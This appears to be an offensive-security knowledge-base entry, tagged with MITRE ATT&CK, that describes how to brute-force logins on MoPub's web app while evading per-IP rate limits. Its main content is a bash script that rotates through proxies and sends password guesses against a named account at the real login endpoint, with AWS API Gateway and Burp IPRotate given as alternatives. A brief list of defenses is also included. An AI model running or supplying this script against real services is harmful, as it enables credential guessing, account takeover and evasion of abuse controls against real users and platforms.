---
tags:
  - brute-force
  - proxy-script
  - aws
type: procedure
tools:
  - '[[tools/curl]]'
  - '[[tools/AWS-API-Gateway]]'
  - '[[tools/IPRotate-Burp-Extension]]'
tactics:
  - '[[Initial Access]]'
commands:
  - '[[commands/mopub-proxy-rotation-bash-script]]'
  - '[[commands/mopub-login-payload-example]]'
platforms:
  - Web
techniques:
  - '[[Brute Force]]'
  - '[[Connection Proxy]]'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques:
  - '[[Password Guessing]]'
id: 0ff7c3d3-f507-4416-acd8-cd53d6199cf0
created_at: '2025-12-14T17:30:26.730Z'
updated_at: '2025-12-14T17:30:26.730Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Brute Force]]'
  - '[[Connection Proxy]]'
---
# Alternative-Bypass-with-AWS-API-Gateway-or-Bash-Proxy-Script

## Summary

This procedure provides alternatives to Python proxy rotation: using AWS API Gateway for IP diversification or a bash script with curl and proxy arrays to brute-force MoPub logins while bypassing rate limits.

## Description

Leverage cloud services like AWS API Gateway to proxy requests through rotating IPs or script local proxy cycling. The bash approach limits to 5 requests per proxy to stay under per-IP thresholds, grepping responses for status codes. This enables ~1000 attempts in 5 minutes without bans.

## Requirements

1. Bash environment with curl
2. Array of proxies (proxyip) and passwords (pass)
3. AWS account for API Gateway setup (optional)
4. CSRF token and cookies

## Defense

Defensive measures and detection strategies:

- Log and correlate login attempts by username from diverse IPs
- Block or throttle known proxy IP ranges
- Deploy WAF rules for rapid credential guessing patterns

## Objectives

1. Distribute requests across proxies/IPs
2. Monitor status codes for success/failure
3. Achieve high-volume brute-force

## Instructions

### Step 1: Prepare Payload

**Context**: Standard login JSON as before.

**Command** ([[commands/mopub-login-payload-example]]):
```json
{"username":"alert.wids@gmail.com","password":"$pas"}
```

> Use in curl data-binary.

### Step 2: Run Bash Proxy Script

**Context**: Define arrays and loop to send limited requests per proxy.

**Command** ([[commands/mopub-proxy-rotation-bash-script]]):
```bash
#!/bin/bash

proxyip=(proxy1 proxy2 ...) //put your proxy here

pass=(pass1 pass2 ...) //put your list of password here

echo "| PASSWORD | PROXY_IP Server_Status "
for(( i=0; i<=100; i++))
do
proxys=${proxyip[i]}

COUNTER=0
for(( p; p<=999; p=$[$p+1]))
do
COUNTER=$[$COUNTER +1]
pas=${pass[p]}
res=`curl -i -s -k -X $'POST' -H $'Host: app.mopub.com' -H $'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0' -H $'Accept: */*' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Content-Type: application/json' -H $'x-csrftoken: █████████' -H $'Content-Length: 62' -H $'Origin: https://app.mopub.com' -H $'Connection: close' -H $''-H $'Referer: https://app.mopub.com/login' -H $'Cookie: csrftoken=████' -b $'csrftoken=█████████' --data-binary $'{"username":"alert.wids@gmail.com","password":"$pas"}'$'https://app.mopub.com/web-client/api/user/login' -x "$proxys"|grep -a ' 403\| 400\| 204\| 401\| 503'`


echo "| $pas | $proxys${res}"
if[[ $COUNTER -ge 5 ]];then
break
fi
continue
done
p=$[$p + 1]
done
```

> Greps for key status codes; echoes results.

### Step 3: AWS Alternative (Optional)

**Context**: Set up API Gateway to forward requests, rotating via multiple endpoints or Lambda for IP diversity. Use with curl or Burp's IPRotate extension.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]] Initial Access

### Techniques

- [[Brute Force]] Brute Force
- [[Connection Proxy]] Proxy

### Sub-Techniques

- [[Password Guessing]] Password Guessing

## Commands Used

- [[commands/mopub-proxy-rotation-bash-script]]
- [[commands/mopub-login-payload-example]]

## Tools Used

- [[tools/curl]]
- [[tools/AWS-API-Gateway]]
- [[tools/IPRotate-Burp-Extension]]

## Tags

- brute-force
- proxy-script
- aws
